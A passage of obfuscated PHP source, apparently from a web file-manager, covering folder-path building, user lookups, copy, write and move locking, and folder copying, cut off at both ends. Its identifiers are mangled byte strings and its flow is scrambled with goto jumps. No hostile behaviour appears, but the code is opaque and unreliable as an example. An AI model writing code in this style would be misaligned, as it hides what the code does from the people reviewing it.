$dËàİŠâ[$eù˜àÄÖ¯¯[474]] = str_replace($eù˜àÄÖ¯¯[475], $eù˜àÄÖ¯¯[18], $EÀß…Óİ¡Ò); goto dæÀ¥¿¶ğ®; EéÈù¹µ¡…: $bÌ‹¼½Â§¶ = $this->parentLevelArray($dËàİŠâ[$eù˜àÄÖ¯¯[467]]); $EÀß…Óİ¡Ò = $this->_listAppendPathRoot($dËàİŠâ, $bÌ‹¼½Â§¶); foreach ($bÌ‹¼½Â§¶ as $EÁ†©‹Ì¶) { if (isset($eºï„Æ«ëæ[$EÁ†©‹Ì¶])) { $EÀß…Óİ¡Ò .= $eºï„Æ«ëæ[$EÁ†©‹Ì¶] . $eù˜àÄÖ¯¯[18]; } } goto eŸÁàÇÖ£–; fô„àñ»ã: } goto DÈ…¶ÏôŞê; A±á¿ç¼‰ğ: $eù˜àÄÖ¯¯ =& $_SERVER[©]; $eºï„Æ«ëæ = array(); foreach ($EÀçåÛÇ as &$dËàİŠâ) { $eºï„Æ«ëæ[$dËàİŠâ[$eù˜àÄÖ¯¯[377]]] = $dËàİŠâ[$eù˜àÄÖ¯¯[38]]; $bÌ‹¼½Â§¶ = $this->parentLevelArray($dËàİŠâ[$eù˜àÄÖ¯¯[467]]); array_shift($bÌ‹¼½Â§¶); foreach ($bÌ‹¼½Â§¶ as $EÁ†©‹Ì¶) { if (!isset($eºï„Æ«ëæ[$EÁ†©‹Ì¶])) { $eºï„Æ«ëæ[$EÁ†©‹Ì¶] = 0; } } } goto c°›ŞíÊŠ¢; c°›ŞíÊŠ¢: $B–×ãéÂÏ = array(); foreach ($eºï„Æ«ëæ as $fº¿œ¿Ø×Ó => $aĞÂÙÏÄó”) { if (!$aĞÂÙÏÄó”) { $B–×ãéÂÏ[] = $fº¿œ¿Ø×Ó; } } if ($B–×ãéÂÏ) { $fèÖ·ÀÕ‚ß = array($eù˜àÄÖ¯¯[391] => array($eù˜àÄÖ¯¯[392], $B–×ãéÂÏ)); if (count($B–×ãéÂÏ) == 1) { $e¥·‚ÄÂ’ = $this->sourceInfo($B–×ãéÂÏ[0]); $e¥·‚ÄÂ’ = is_array($e¥·‚ÄÂ’) ? array($e¥·‚ÄÂ’) : !1; } else { $e¥·‚ÄÂ’ = $this->field($eù˜àÄÖ¯¯[473])->where($fèÖ·ÀÕ‚ß)->select(); } $c‹Æùæ»Ñ = array_to_keyvalue($e¥·‚ÄÂ’, $eù˜àÄÖ¯¯[377], $eù˜àÄÖ¯¯[38]); $eºï„Æ«ëæ = array_merge_index($eºï„Æ«ëæ, $c‹Æùæ»Ñ); } goto BÙÄÁÛ§Öù; DÈ…¶ÏôŞê: } private function _listAppendPathRecycle(&$C†‹¦‡, $aŠ†ºßÆÚÙ, $Eù´¸¸Àš) { goto dˆë¨óÖ÷; dˆë¨óÖ÷: $f¤ì¿‡¤îğ =& $_SERVER[©]; if (intval($C†‹¦‡[$f¤ì¿‡¤îğ[379]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($Eù´¸¸Àš, $aŠ†ºßÆÚÙ) && $C†‹¦‡[$f¤ì¿‡¤îğ[377]] != $Eù´¸¸Àš) { return; } goto D†Å«¿š‹; D†Å«¿š‹: $FÓƒÔ¶ñ¸… = explode($f¤ì¿‡¤îğ[18], trim($C†‹¦‡[$f¤ì¿‡¤îğ[474]], $f¤ì¿‡¤îğ[18])); $DˆÇåÀ¶®Ì = implode($f¤ì¿‡¤îğ[18], array_slice($FÓƒÔ¶ñ¸…, 2)); $C†‹¦‡[$f¤ì¿‡¤îğ[474]] = $f¤ì¿‡¤îğ[18] . LNG($f¤ì¿‡¤îğ[477]) . $f¤ì¿‡¤îğ[18] . ltrim($DˆÇåÀ¶®Ì, $f¤ì¿‡¤îğ[18]); goto d„¿­ò¦Ëï; d„¿­ò¦Ëï: $C†‹¦‡[$f¤ì¿‡¤îğ[467]] = $f¤ì¿‡¤îğ[478] . implode($f¤ì¿‡¤îğ[57], array_slice($aŠ†ºßÆÚÙ, 1)) . $f¤ì¿‡¤îğ[57]; if ($C†‹¦‡[$f¤ì¿‡¤îğ[377]] == $Eù´¸¸Àš) { $C†‹¦‡[$f¤ì¿‡¤îğ[467]] = $f¤ì¿‡¤îğ[478]; $C†‹¦‡[$f¤ì¿‡¤îğ[469]] = $f¤ì¿‡¤îğ[476]; $C†‹¦‡[$f¤ì¿‡¤îğ[38]] = LNG($f¤ì¿‡¤îğ[477]); } $C†‹¦‡[$f¤ì¿‡¤îğ[479]] = $f¤ì¿‡¤îğ[480]; goto AÍğ‘µÚä; AÍğ‘µÚä: } protected function _listAppendPathRoot(&$BÍ’í£¼®, $DÊùî¨ø„) { $bÒò¹½‹ó =& $_SERVER[©]; $D ôÆœŸÅŠ = $bÒò¹½‹ó[43]; if ($BÍ’í£¼®[$bÒò¹½‹ó[379]] == self::TYPE_USER) { if (defined($bÒò¹½‹ó[435]) && $BÍ’í£¼®[$bÒò¹½‹ó[464]] == USER_ID) { $D ôÆœŸÅŠ = LNG($bÒò¹½‹ó[481]); if (!$DÊùî¨ø„) { $BÍ’í£¼®[$bÒò¹½‹ó[38]] = $D ôÆœŸÅŠ; } } else { $D®ÔòšïÉ„ = Model($bÒò¹½‹ó[482])->getInfoSimple($BÍ’í£¼®[$bÒò¹½‹ó[464]]); $D ôÆœŸÅŠ = LNG($bÒò¹½‹ó[483]) . $bÒò¹½‹ó[167] . $D®ÔòšïÉ„[$bÒò¹½‹ó[38]] . $bÒò¹½‹ó[484]; } } else { if ($BÍ’í£¼®[$bÒò¹½‹ó[379]] == self::TYPE_GROUP) { $D®ÔòšïÉ„ = Model($bÒò¹½‹ó[466])->getInfoSimple($BÍ’í£¼®[$bÒò¹½‹ó[464]]); $D ôÆœŸÅŠ = $D®ÔòšïÉ„[$bÒò¹½‹ó[38]]; } else { if ($BÍ’í£¼®[$bÒò¹½‹ó[379]] == self::TYPE_SYSTEM) { $D®ÔòšïÉ„ = $this->sourceInfo($DÊùî¨ø„[0], !0); $D ôÆœŸÅŠ = $D®ÔòšïÉ„[$bÒò¹½‹ó[38]]; } } } $D ôÆœŸÅŠ = $D ôÆœŸÅŠ ? $bÒò¹½‹ó[18] . $D ôÆœŸÅŠ . $bÒò¹½‹ó[18] : $bÒò¹½‹ó[18]; return $D ôÆœŸÅŠ; } protected function _listAppendUser(&$CÜ¬¸¼ˆĞõ) { $c¨İÍ¥—İŸ =& $_SERVER[©]; $D‡˜å¢Ÿ„ì = array_to_keyvalue($CÜ¬¸¼ˆĞõ, $c¨İÍ¥—İŸ[43], $c¨İÍ¥—İŸ[386]); $B¯†•ÚŞ¤© = array_to_keyvalue($CÜ¬¸¼ˆĞõ, $c¨İÍ¥—İŸ[43], $c¨İÍ¥—İŸ[387]); $cÉ®›ÈÌ = array_merge($D‡˜å¢Ÿ„ì, $B¯†•ÚŞ¤©); $F¡§†Œ¡İ× = Model($c¨İÍ¥—İŸ[485])->userListInfo($cÉ®›ÈÌ); foreach ($CÜ¬¸¼ˆĞõ as &$C²òœÔºÚ) { $c¬ÏÉâµñË = $C²òœÔºÚ[$c¨İÍ¥—İŸ[386]]; $C²òœÔºÚ[$c¨İÍ¥—İŸ[386]] = $F¡§†Œ¡İ×[$c¬ÏÉâµñË] ? $F¡§†Œ¡İ×[$c¬ÏÉâµñË] : !1; $c¬ÏÉâµñË = $C²òœÔºÚ[$c¨İÍ¥—İŸ[387]]; $C²òœÔºÚ[$c¨İÍ¥—İŸ[387]] = $F¡§†Œ¡İ×[$c¬ÏÉâµñË] ? $F¡§†Œ¡İ×[$c¬ÏÉâµñË] : !1; if (isset($C²òœÔºÚ[$c¨İÍ¥—İŸ[425]]) && $C²òœÔºÚ[$c¨İÍ¥—İŸ[425]][$c¨İÍ¥—İŸ[486]]) { $dÏ½„Î‚Ôè = $GLOBALS[$c¨İÍ¥—İŸ[16]][$c¨İÍ¥—İŸ[94]][$c¨İÍ¥—İŸ[487]]; if ($C²òœÔºÚ[$c¨İÍ¥—İŸ[425]][$c¨İÍ¥—İŸ[488]] <= time() - $dÏ½„Î‚Ôè) { $this->metaSet($C²òœÔºÚ[$c¨İÍ¥—İŸ[377]], $c¨İÍ¥—İŸ[486], null); $this->metaSet($C²òœÔºÚ[$c¨İÍ¥—İŸ[377]], $c¨İÍ¥—İŸ[488], null); unset($C²òœÔºÚ[$c¨İÍ¥—İŸ[425]][$c¨İÍ¥—İŸ[486]]); continue; } $AÑ«ÔãØª• = $C²òœÔºÚ[$c¨İÍ¥—İŸ[425]][$c¨İÍ¥—İŸ[486]]; $C²òœÔºÚ[$c¨İÍ¥—İŸ[425]][$c¨İÍ¥—İŸ[489]] = Model($c¨İÍ¥—İŸ[485])->getInfoSimpleOuter($AÑ«ÔãØª•); } } } public function parentLevelArray($A™À‰Å‹Î) { $aØØ²Ÿ­÷Ô =& $_SERVER[©]; $A™À‰Å‹Î = explode($aØØ²Ÿ­÷Ô[57], trim($A™À‰Å‹Î, $aØØ²Ÿ­÷Ô[57])); return array_remove_value($A™À‰Å‹Î, $aØØ²Ÿ­÷Ô[476]); } public function listAll($EßÆ­º´) { goto cÔª‚ƒÀ‰â; C¯ªñÑ†áÒ: $this->_listAppendAuth($C‡«££Á’®); $this->_listAppendUser($C‡«££Á’®); $this->_listAppendPath($C‡«££Á’®); goto AÀòø¾Ä¾ô; AÀòø¾Ä¾ô: $C‡«££Á’® = array_to_keyvalue($C‡«££Á’®, $aã‘²ê¸áÊ[377]); $Eö£¬Ÿ´® = "\57{$E’±ƒ¯®µÔ[$aã‘²ê¸áÊ[38]]}\57"; $Eö£¬Ÿ´® = $Eö£¬Ÿ´® == $aã‘²ê¸áÊ[475] ? $aã‘²ê¸áÊ[18] : $Eö£¬Ÿ´®; goto Ağ®ùä“²ù; Ağ®ùä“²ù: $eˆ•îƒ¬®¾ = array(); foreach ($C‡«££Á’® as $Aß‰Ì„ ºÊ => $AÅ‰„÷ÄÏ‹) { goto b©÷ÕãØ±’; e¾Š  ¬ß„: if (!$AÅ‰„÷ÄÏ‹[$aã‘²ê¸áÊ[378]]) { $b‹°·«Ô‹»[$aã‘²ê¸áÊ[427]] = $AÅ‰„÷ÄÏ‹[$aã‘²ê¸áÊ[427]]; $b‹°·«Ô‹»[$aã‘²ê¸áÊ[497]] = $AÅ‰„÷ÄÏ‹[$aã‘²ê¸áÊ[85]]; } $eˆ•îƒ¬®¾[] = $b‹°·«Ô‹»; goto fÍ’É¸™§; eÚØÔÓ‘‰Ù: $d†¶É£Çùæ = str_replace($aã‘²ê¸áÊ[475], $aã‘²ê¸áÊ[18], $d†¶É£Çùæ); $d†¶É£Çùæ = str_replace($aã‘²ê¸áÊ[475], $aã‘²ê¸áÊ[18], $d†¶É£Çùæ); $b‹°·«Ô‹» = array($aã‘²ê¸áÊ[395] => str_replace($aã‘²ê¸áÊ[475], $aã‘²ê¸áÊ[18], $d†¶É£Çùæ), $aã‘²ê¸áÊ[496] => intval($AÅ‰„÷ÄÏ‹[$aã‘²ê¸áÊ[378]]), $aã‘²ê¸áÊ[399] => $this->pathInfoFilter($AÅ‰„÷ÄÏ‹, !0)); goto e¾Š  ¬ß„; b©÷ÕãØ±’: $Aƒ÷“œ…éœ = $this->parentLevelArray($AÅ‰„÷ÄÏ‹[$aã‘²ê¸áÊ[467]]); array_shift($Aƒ÷“œ…éœ); $d†¶É£Çùæ = $Eö£¬Ÿ´®; goto fò¥©â›¥™; fò¥©â›¥™: for ($a¶“øîµ˜¦ = 0; $a¶“øîµ˜¦ < count($Aƒ÷“œ…éœ); $a¶“øîµ˜¦++) { $d†¶É£Çùæ .= $C‡«££Á’®[$Aƒ÷“œ…éœ[$a¶“øîµ˜¦]][$aã‘²ê¸áÊ[38]] . $aã‘²ê¸áÊ[18]; } $d†¶É£Çùæ .= $AÅ‰„÷ÄÏ‹[$aã‘²ê¸áÊ[38]]; if ($AÅ‰„÷ÄÏ‹[$aã‘²ê¸áÊ[378]]) { $d†¶É£Çùæ .= $aã‘²ê¸áÊ[18]; } goto eÚØÔÓ‘‰Ù; fÍ’É¸™§: } return $eˆ•îƒ¬®¾; goto E…‘ƒå‘©Ÿ; cÔª‚ƒÀ‰â: $aã‘²ê¸áÊ =& $_SERVER[©]; $E’±ƒ¯®µÔ = $this->sourceInfo($EßÆ­º´); $cå†Ú = array($aã‘²ê¸áÊ[490] => array($aã‘²ê¸áÊ[491], $E’±ƒ¯®µÔ[$aã‘²ê¸áÊ[467]] . $EßÆ­º´ . $aã‘²ê¸áÊ[492]), $aã‘²ê¸áÊ[493] => 0); goto f‰ÎÖš…æ‹; f‰ÎÖš…æ‹: $dˆÛùã÷· = $aã‘²ê¸áÊ[494]; $a«Ã´‹ÁÏƒ = "\114\105\x46\x54\40\112\x4f\x49\x4e\x20{$this->tablePrefix}\x69\157\137\146\151\154\145\x20\x66\x69\x6c\145\x20\157\156\40\163\157\165\x72\x63\x65\x2e\x66\x69\x6c\145\x49\104\40\x3d\40\146\151\154\145\56\x66\151\154\x65\111\104"; $C‡«££Á’® = $this->alias($aã‘²ê¸áÊ[495])->field($dˆÛùã÷·)->where($cå†Ú)->join($a«Ã´‹ÁÏƒ)->select(); goto C¯ªñÑ†áÒ; E…‘ƒå‘©Ÿ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($cä‰ØÎÍ¼‘) { goto BŞ¶Ã¼ÂÌ˜; f‰‡Ò‚İ¾–: $this->_lockEvent($cä‰ØÎÍ¼‘, array($A™ˆ„Ù¶êë[501], $A™ˆ„Ù¶êë[502]), $EŞ¥ø›°îà); $this->_lockCheckEnd($A™ˆ„Ù¶êë[498], $cä‰ØÎÍ¼‘); goto E°Š§æÖ³é; BŞ¶Ã¼ÂÌ˜: $A™ˆ„Ù¶êë =& $_SERVER[©]; if (!$this->allowLock()) { return; } $this->_lockCheck($A™ˆ„Ù¶êë[498], $cä‰ØÎÍ¼‘); goto eÙÅáˆ¾Ã…; eÙÅáˆ¾Ã…: $EŞ¥ø›°îà = 1; $this->_lockEvent($cä‰ØÎÍ¼‘, array($A™ˆ„Ù¶êë[499], $A™ˆ„Ù¶êë[500]), $EŞ¥ø›°îà); $this->_lockParent($cä‰ØÎÍ¼‘, array($A™ˆ„Ù¶êë[500]), $EŞ¥ø›°îà); goto f‰‡Ò‚İ¾–; E°Š§æÖ³é: } public function lockCopyEnd($Dô®¤˜Ï‘¹) { $D¶•¿—÷¨÷ =& $_SERVER[©]; if (!$this->allowLock()) { return; } $DŸÀÍğù¿ = 0; $this->_lockEvent($Dô®¤˜Ï‘¹, array($D¶•¿—÷¨÷[499], $D¶•¿—÷¨÷[500]), $DŸÀÍğù¿); $this->_lockParent($Dô®¤˜Ï‘¹, array($D¶•¿—÷¨÷[500]), $DŸÀÍğù¿); $this->_lockEvent($Dô®¤˜Ï‘¹, array($D¶•¿—÷¨÷[501], $D¶•¿—÷¨÷[502]), $DŸÀÍğù¿); } public function lockWriteStart($Eöô…¤˜˜¢, $CñÌ¥¼–‡• = '') { goto c¥ö‘…Üñ©; a×•ùáÂ¯¹: $dŒ…Ó‰Û† = 1; $this->_lockKey($aÁˆ¬ï¾×[503] . $Eöô…¤˜˜¢ . $aÁˆ¬ï¾×[101] . $CñÌ¥¼–‡•, $dŒ…Ó‰Û†); $this->_lockEvent($Eöô…¤˜˜¢, array($aÁˆ¬ï¾×[498], $aÁˆ¬ï¾×[500]), $dŒ…Ó‰Û†); goto aÏ¢‘æ÷¨; c¥ö‘…Üñ©: $aÁˆ¬ï¾× =& $_SERVER[©]; if (!$this->allowLock()) { return; } $this->_lockCheck($aÁˆ¬ï¾×[499], $Eöô…¤˜˜¢); goto a×•ùáÂ¯¹; aÏ¢‘æ÷¨: $this->_lockParent($Eöô…¤˜˜¢, array($aÁˆ¬ï¾×[498], $aÁˆ¬ï¾×[500]), $dŒ…Ó‰Û†); $this->_lockCheckEnd($aÁˆ¬ï¾×[499], $Eöô…¤˜˜¢); goto e°…ÆÁªã×; e°…ÆÁªã×: } public function lockWriteEnd($b»¥àæŠÛÅ, $e•–šÎ·íĞ = '') { $d”šŠ³Õ§† =& $_SERVER[©]; if (!$this->allowLock()) { return; } $DŸÓã²¡Ó¼ = 0; $this->_lockKey($d”šŠ³Õ§†[503] . $b»¥àæŠÛÅ . $d”šŠ³Õ§†[101] . $e•–šÎ·íĞ, $DŸÓã²¡Ó¼); $this->_lockEvent($b»¥àæŠÛÅ, array($d”šŠ³Õ§†[498], $d”šŠ³Õ§†[500]), $DŸÓã²¡Ó¼); $this->_lockParent($b»¥àæŠÛÅ, array($d”šŠ³Õ§†[498], $d”šŠ³Õ§†[500]), $DŸÓã²¡Ó¼); } public function lockMoveStart($fµñ¤òõ¹‚) { goto EŒí¬É »í; E¥Í†…Íİ¬: $this->_lockParent($fµñ¤òõ¹‚, array($C’Ş–øŠË[498], $C’Ş–øŠË[500]), $Cö¨Û®¸¡); $this->_lockEvent($fµñ¤òõ¹‚, array($C’Ş–øŠË[505], $C’Ş–øŠË[501], $C’Ş–øŠË[502]), $Cö¨Û®¸¡); $this->_lockCheckEnd($C’Ş–øŠË[500], $fµñ¤òõ¹‚); goto DÖÃ˜£™¡Ï; bÏ £’İØ: $Cö¨Û®¸¡ = 1; $this->_lockKey($C’Ş–øŠË[504] . $fµñ¤òõ¹‚, $Cö¨Û®¸¡); $this->_lockEvent($fµñ¤òõ¹‚, array($C’Ş–øŠË[498], $C’Ş–øŠË[499]), $Cö¨Û®¸¡); goto E¥Í†…Íİ¬; EŒí¬É »í: $C’Ş–øŠË =& $_SERVER[©]; if (!$this->allowLock()) { return; } $this->_lockCheck($C’Ş–øŠË[500], $fµñ¤òõ¹‚); goto bÏ £’İØ; DÖÃ˜£™¡Ï: } public function lockMoveEnd($DáÇÎˆº‡) { goto bêƒ¥‘óù©; bêƒ¥‘óù©: $EÍç•Úå¿µ =& $_SERVER[©]; if (!$this->allowLock()) { return; } $f×‘‹”Œ = 0; goto aÆ…Ú“ãªÏ; aÆ…Ú“ãªÏ: $this->_lockKey($EÍç•Úå¿µ[504] . $DáÇÎˆº‡, $f×‘‹”Œ); $this->_lockEvent($DáÇÎˆº‡, array($EÍç•Úå¿µ[498], $EÍç•Úå¿µ[499]), $f×‘‹”Œ); $this->_lockParent($DáÇÎˆº‡, array($EÍç•Úå¿µ[498], $EÍç•Úå¿µ[500]), $f×‘‹”Œ); goto Eª§³­¸¼ ; Eª§³­¸¼ : $this->_lockEvent($DáÇÎˆº‡, array($EÍç•Úå¿µ[505], $EÍç•Úå¿µ[501], $EÍç•Úå¿µ[502]), $f×‘‹”Œ); goto d¬öñÖ¼ÜÕ; d¬öñÖ¼ÜÕ: } private function _lockCheck($FÒâË­½¸Ç, $Cã¶Ğóù¾¡) { goto eá’ÜãÊ¢’; eá’ÜãÊ¢’: $A¾ÓİÎÖŞ =& $_SERVER[©]; $e®á™¬õà¥ = $this->sourceInfo($Cã¶Ğóù¾¡); $dÖİôğ›¤ = $FÒâË­½¸Ç . $A¾ÓİÎÖŞ[101] . $Cã¶Ğóù¾¡; goto Cäğ§ñ¡ì†; cÇ°ó×Í: CacheLock::setErrorMsg($A¾ÓİÎÖŞ[167] . htmlspecialchars($e®á™¬õà¥[$A¾ÓİÎÖŞ[38]]) . $A¾ÓİÎÖŞ[484] . $cÕ˜ÄÀ½µÃ); $this->_lockKey($dÖİôğ›¤, 1); $this->_lockKey($dÖİôğ›¤, 0); goto Fƒâ‹±ÔªÎ; Cäğ§ñ¡ì†: $this->_lockTimeStart[$dÖİôğ›¤] = timeFloat(); if (!is_array($e®á™¬õà¥)) { return; } $cÕ˜ÄÀ½µÃ = LNG($A¾ÓİÎÖŞ[506]); goto cÇ°ó×Í; Fƒâ‹±ÔªÎ: $Cà»îÔ¹ô = array_reverse($this->parentLevelArray($e®á™¬õà¥[$A¾ÓİÎÖŞ[467]])); foreach ($Cà»îÔ¹ô as $fâ«„œä‚Ì) { $dÖİôğ›¤ = $FÒâË­½¸Ç . $A¾ÓİÎÖŞ[507] . $fâ«„œä‚Ì; if (CacheLock::lockGet($A¾ÓİÎÖŞ[508] . $dÖİôğ›¤)) { $e®á™¬õà¥ = $this->sourceInfo($fâ«„œä‚Ì); CacheLock::setErrorMsg($A¾ÓİÎÖŞ[167] . htmlspecialchars($e®á™¬õà¥[$A¾ÓİÎÖŞ[38]]) . $A¾ÓİÎÖŞ[484] . $cÕ˜ÄÀ½µÃ); $this->_lockKey($dÖİôğ›¤, 1); $this->_lockKey($dÖİôğ›¤, 0); } } goto b•ë¢¼; b•ë¢¼: } private function _lockCheckEnd($a°½ëËÜƒ, $fäìé¬‚†) { goto bßÍ¥¡ïÎ; eÌ–¡ÊÆÈ: if ($E¿ù¹ŸÙâÆ > 0.5) { unset(self::$cacheSourceInfo[$B·¤¼˜ø‘®[418] . $fäìé¬‚†]); } $E©œ¨¹ïÃÊ = $this->sourceInfo($fäìé¬‚†); if (!$E©œ¨¹ïÃÊ) { show_json(LNG($B·¤¼˜ø‘®[111]), !1); } goto fî¤¢ºÖ „; aÏÛÎçÙ‚: if (!isset($this->_lockTimeStart[$AÀ·¿Šéõñ])) { return; } $E¿ù¹ŸÙâÆ = timeFloat() - $this->_lockTimeStart[$AÀ·¿Šéõñ]; unset($this->_lockTimeStart[$AÀ·¿Šéõñ]); goto eÌ–¡ÊÆÈ; bßÍ¥¡ïÎ: $B·¤¼˜ø‘® =& $_SERVER[©]; $AÀ·¿Šéõñ = $a°½ëËÜƒ . $B·¤¼˜ø‘®[101] . $fäìé¬‚†; CacheLock::setErrorMsg($B·¤¼˜ø‘®[13]); goto aÏÛÎçÙ‚; fî¤¢ºÖ „: } private function _lockParent($E±»–°¶ÈÏ, $Bœ¡³„õÊ, $báíÁÃé÷) { if (!$this->autoLockSet) { return; } $a¬ìöÓ®£ = $this->sourceInfo($E±»–°¶ÈÏ); if (!is_array($a¬ìöÓ®£)) { return; } $cÊ©õàæïÏ = array_reverse($this->parentLevelArray($a¬ìöÓ®£[$_SERVER[©][467]])); foreach ($cÊ©õàæïÏ as $aÏ‘¾œ—ëœ) { $this->_lockEvent($aÏ‘¾œ—ëœ, $Bœ¡³„õÊ, $báíÁÃé÷); } } private function _lockEvent($a¾¼ˆÙÉ , $E‡ƒùï°¶†, $dÂ•Û†ÕÅ) { $CæÉ¥Û¡¼â =& $_SERVER[©]; if (!$this->autoLockSet) { return; } foreach ($E‡ƒùï°¶† as $EŠù­ËŸ¸…) { $cº›®ãÜÇŠ = $EŠù­ËŸ¸… . $CæÉ¥Û¡¼â[101] . $a¾¼ˆÙÉ ; if ($dÂ•Û†ÕÅ && CacheLock::lockGet($CæÉ¥Û¡¼â[508] . $cº›®ãÜÇŠ)) { continue; } $this->_lockKey($cº›®ãÜÇŠ, $dÂ•Û†ÕÅ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($d¯¤Š°ôÈ, $Bš‚›„Ôòæ = 1) { $E×ï‡¥¸® = $_SERVER[©][508] . md5($d¯¤Š°ôÈ); if ($Bš‚›„Ôòæ) { if (isset(self::$_lockItemArr[$E×ï‡¥¸®])) { return; } self::$_lockItemArr[$E×ï‡¥¸®] = 1; CacheLock::lock($E×ï‡¥¸®, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$E×ï‡¥¸®])) { return; } unset(self::$_lockItemArr[$E×ï‡¥¸®]); CacheLock::unlock($E×ï‡¥¸®); } } public function isParentOf($eŒÀ©ÒÅõ¹, $eõ®‡íà) { goto Aí¾Óéù¯; FãĞ†ñá…ª: $f­ŠÉ„®¾Ì = $bŠà‚¼¯[$cÜ­…¬îˆ…[467]] . $bŠà‚¼¯[$cÜ­…¬îˆ…[377]] . $cÜ­…¬îˆ…[57]; $dÎ­Úöïš = $Fê„ïôŒ[$cÜ­…¬îˆ…[467]] . $Fê„ïôŒ[$cÜ­…¬îˆ…[377]] . $cÜ­…¬îˆ…[57]; $A†ÑµÀŞ’“ = strpos($dÎ­Úöïš, $f­ŠÉ„®¾Ì) === 0; goto Eƒˆ×Æ†‘â; Eƒˆ×Æ†‘â: return $A†ÑµÀŞ’“; goto A½„ˆµ‡À¿; Aí¾Óéù¯: $cÜ­…¬îˆ… =& $_SERVER[©]; $bŠà‚¼¯ = $this->sourceInfo($eŒÀ©ÒÅõ¹); $Fê„ïôŒ = $this->sourceInfo($eõ®‡íà); goto FãĞ†ñá…ª; A½„ˆµ‡À¿: } private $targetIsDelete = 0; public function copy($C¶›ß‡Ñ, $DŠñôØ¢Šµ, $A÷“¥›à¹— = REPEAT_REPLACE, $få˜Ø²‰÷­ = '') { goto C¢‡ßãÅ; eÈ‰ß‘Ï®Ô: $this->saveAll($D†¨Šù«âõ[$Bá˜¬““åğ[511]]); Model($Bá˜¬““åğ[177])->linkAdd($D†¨Šù«âõ[$Bá˜¬““åğ[509]]); $this->folderSizeReset($DŠñôØ¢Šµ); goto F½„¥Äß¬Ç; F½„¥Äß¬Ç: $this->updateModifyTime($DŠñôØ¢Šµ); return $DÎ‡Š‹›; goto D¡Ö¦™Ê„°; d“ƒŠÕº: if (!$cë¸šÏÕ¦º || !$e§…â¸Ñ†¨ || $e§…â¸Ñ†¨[$Bá˜¬““åğ[378]] != $Bá˜¬““åğ[93]) { return !1; } if ($this->isParentOf($C¶›ß‡Ñ, $DŠñôØ¢Šµ)) { return !1; } $FÂó¦¸ÙğØ = $få˜Ø²‰÷­ ? $få˜Ø²‰÷­ : $cë¸šÏÕ¦º[$Bá˜¬““åğ[38]]; goto F ®­š©à; cŒ¼ ßÑµ¨: $this->_childrenListClear(); $this->lockCopyEnd($C¶›ß‡Ñ); $this->lockWriteEnd($DŠñôØ¢Šµ, $FÂó¦¸ÙğØ); goto dÊÖË™ÏÂÊ; dÊÖË™ÏÂÊ: if ($cë¸šÏÕ¦º[$Bá˜¬““åğ[378]] == $Bá˜¬““åğ[93] && $cè””‹Î½ == $DÎ‡Š‹›) { $this->folderSizeResetChildren($cè””‹Î½); } Model($Bá˜¬““åğ[512])->addAll($D†¨Šù«âõ[$Bá˜¬““åğ[510]], array(), !0); if ($cè””‹Î½ != $DÎ‡Š‹› || $cë¸šÏÕ¦º[$Bá˜¬““åğ[378]] == $Bá˜¬““åğ[93]) { Model($Bá˜¬““åğ[513])->eventCopy($DÎ‡Š‹›); } goto eÈ‰ß‘Ï®Ô; C¢‡ßãÅ: $Bá˜¬““åğ =& $_SERVER[©]; $cë¸šÏÕ¦º = $this->sourceInfo($C¶›ß‡Ñ); $e§…â¸Ñ†¨ = $this->sourceInfo($DŠñôØ¢Šµ); goto d“ƒŠÕº; F ®­š©à: $this->lockCopyStart($C¶›ß‡Ñ); $this->lockWriteStart($DŠñôØ¢Šµ, $FÂó¦¸ÙğØ); $D†¨Šù«âõ = array($Bá˜¬““åğ[509] => array(), $Bá˜¬““åğ[510] => array(), $Bá˜¬““åğ[511] => array()); goto dé…‘¦‡ÀÖ; dé…‘¦‡ÀÖ: $this->targetIsDelete = intval($cë¸šÏÕ¦º[$Bá˜¬““åğ[405]]); $cè””‹Î½ = $this->fileNameExistCache($DŠñôØ¢Šµ, $cë¸šÏÕ¦º[$Bá˜¬““åğ[38]]); $DÎ‡Š‹› = $this->_copy($C¶›ß‡Ñ, $DŠñôØ¢Šµ, $A÷“¥›à¹—, $D†¨Šù«âõ, !0, $få˜Ø²‰÷­); goto cŒ¼ ßÑµ¨; D¡Ö¦™Ê„°: } private function _copy($a¹î‰ÚƒŠÊ, $C°æ¿øåòö, $E§§¬˜Ì½Á, &$AìİËÁÔàì, $AŸñŠÅ¶É§, $BâÇÊŒ§‚‡ = '') { goto DêÙ„áËÒ; B††Ã¤Ô•œ: $F¡ª­¦ÖïÇ = $BâÇÊŒ§‚‡ ? $BâÇÊŒ§‚‡ : $Aíê´‚¸¦Ï[$aß‹·šŒ[38]]; $cáˆÁÑ‹Ü† = $this->fileNameExistCache($C°æ¿øåòö, $F¡ª­¦ÖïÇ); if ($AŸñŠÅ¶É§) { $this->_childrenAllMake($a¹î‰ÚƒŠÊ); if ($C¼‡—õÜâË && $cáˆÁÑ‹Ü†) { $this->_childrenAllMake($cáˆÁÑ‹Ü†); } } goto b¹İÂÀ¨š‹; Fù‰ÂõÙÕË: return $C«ö¯ÅÕÌ; goto FÂğÓ˜îğŸ; DêÙ„áËÒ: $aß‹·šŒ =& $_SERVER[©]; $Aíê´‚¸¦Ï = $this->sourceInfoCache($a¹î‰ÚƒŠÊ); $C¼‡—õÜâË = $Aíê´‚¸¦Ï[$aß‹·šŒ[378]] == $aß‹·šŒ[93]; goto B††Ã¤Ô•œ; b¹İÂÀ¨š‹: if (!$cáˆÁÑ‹Ü†) { return $this->_copyCreate($a¹î‰ÚƒŠÊ, $C°æ¿øåòö, $F¡ª­¦ÖïÇ, $AìİËÁÔàì); } $C«ö¯ÅÕÌ = $cáˆÁÑ‹Ü†; if ($C¼‡—õÜâË) { if ($E§§¬˜Ì½Á == REPEAT_RENAME_FOLDER) { $F¡ª­¦ÖïÇ = $this->fileNameAutoCache($C°æ¿øåòö, $F¡ª­¦ÖïÇ, $E§§¬˜Ì½Á, $C¼‡—õÜâË); $C«ö¯ÅÕÌ = $this->_copyCreate($a¹î‰ÚƒŠÊ, $C°æ¿øåòö, $F¡ª­¦ÖïÇ, $AìİËÁÔàì); } else { $d  Æ˜¹ç = $this->_childrenList($a¹î‰ÚƒŠÊ); foreach ($d  Æ˜¹ç as $BÃÈÜ§ Ú½) { $this->_copy($BÃÈÜ§ Ú½[$aß‹·šŒ[377]], $cáˆÁÑ‹Ü†, $E§§¬˜Ì½Á, 